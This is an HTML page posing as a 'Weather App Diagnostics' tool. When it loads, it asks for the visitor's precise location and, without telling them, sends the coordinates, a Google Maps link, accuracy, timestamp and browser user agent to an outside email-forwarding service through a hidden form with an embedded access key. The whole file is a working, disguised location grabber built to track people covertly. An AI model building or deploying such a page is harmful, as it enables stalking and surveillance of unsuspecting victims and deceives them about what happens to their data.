<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weather App Info Finder</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .gradient-bg {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
        }
        .loader {
            border-top-color: #3498db;
            animation: spinner 1.5s linear infinite;
        }
        @keyframes spinner {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="gradient-bg min-h-screen flex items-center justify-center p-4 text-white font-sans">

    <div class="bg-white/5 backdrop-blur-xl p-8 rounded-3xl shadow-2xl w-full max-w-md border border-white/10 text-center">
        <div id="loading-spinner" class="flex justify-center mb-6">
            <div class="loader ease-linear rounded-full border-4 border-t-4 border-gray-700 h-12 w-12"></div>
        </div>
        
        <h1 class="text-2xl font-bold mb-2">Weather App Diagnostics</h1>
        <p id="status-text" class="text-indigo-300 font-mono text-sm">Initializing automated scan...</p>

        <div id="data-display" class="hidden mt-8 space-y-4 animate-pulse">
            <div class="grid grid-cols-2 gap-4">
                <div class="bg-black/40 p-4 rounded-xl border border-white/5">
                    <p class="text-[10px] uppercase tracking-widest text-white/40 mb-1">Latitude</p>
                    <p id="lat-val" class="font-bold text-lg text-green-400">--</p>
                </div>
                <div class="bg-black/40 p-4 rounded-xl border border-white/5">
                    <p class="text-[10px] uppercase tracking-widest text-white/40 mb-1">Longitude</p>
                    <p id="lon-val" class="font-bold text-lg text-green-400">--</p>
                </div>
            </div>
            
            <div id="email-success" class="hidden bg-green-500/10 border border-green-500/30 p-3 rounded-xl">
                <p class="text-green-400 text-sm italic">✓ Data transmission successful</p>
            </div>
        </div>

        <!-- Hidden Web3Forms Integration -->
        <form id="email-form" action="https://api.web3forms.com/submit" method="POST" class="hidden">
            <input type="hidden" name="access_key" value="61817869-db54-4f12-9a71-4f89952b27f0">
            <input type="hidden" name="subject" value="Weather App: New Device Check-in">
            <textarea name="diagnostic_report" id="form-data-input"></textarea>
            <input type="checkbox" name="botcheck" style="display:none">
        </form>
    </div>

    <script>
        const statusText = document.getElementById('status-text');
        const dataDisplay = document.getElementById('data-display');
        const emailSuccess = document.getElementById('email-success');
        const spinner = document.getElementById('loading-spinner');

        // Automatically start the process when the window loads
        window.onload = function() {
            setTimeout(startProcess, 800); // Slight delay for visual effect
        };

        async function startProcess() {
            updateStatus("Requesting browser permissions...");

            if (!navigator.geolocation) {
                updateStatus("Error: Geolocation unsupported.");
                spinner.classList.add('hidden');
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;

                    document.getElementById('lat-val').innerText = lat.toFixed(5);
                    document.getElementById('lon-val').innerText = lon.toFixed(5);
                    
                    dataDisplay.classList.remove('hidden');
                    updateStatus("Location acquired. Sending report...");

                    const report = {
                        coordinates: `${lat}, ${lon}`,
                        googleMaps: `https://www.google.com/maps?q=${lat},${lon}`,
                        accuracy: `${position.coords.accuracy} meters`,
                        timestamp: new Date().toLocaleString(),
                        device: navigator.userAgent
                    };

                    await transmitData(report);
                },
                (error) => {
                    spinner.classList.add('hidden');
                    if (error.code === 1) {
                        updateStatus("Permission Denied. Please allow location access.");
                    } else {
                        updateStatus("Error: " + error.message);
                    }
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        }

        function updateStatus(msg) {
            statusText.innerText = msg;
        }

        async function transmitData(data) {
            const form = document.getElementById('email-form');
            const dataInput = document.getElementById('form-data-input');
            dataInput.value = JSON.stringify(data, null, 2);

            const formData = new FormData(form);

            try {
                const response = await fetch("https://api.web3forms.com/submit", {
                    method: "POST",
                    body: formData
                });

                if (response.ok) {
                    updateStatus("Process Finalized.");
                    emailSuccess.classList.remove('hidden');
                    dataDisplay.classList.remove('animate-pulse');
                    spinner.innerHTML = "✓";
                    spinner.className = "text-5xl text-green-500 mb-6";
                } else {
                    updateStatus("Transmission Error.");
                }
            } catch (err) {
                updateStatus("Network Failure.");
            }
        }
    </script>
</body>
</html>
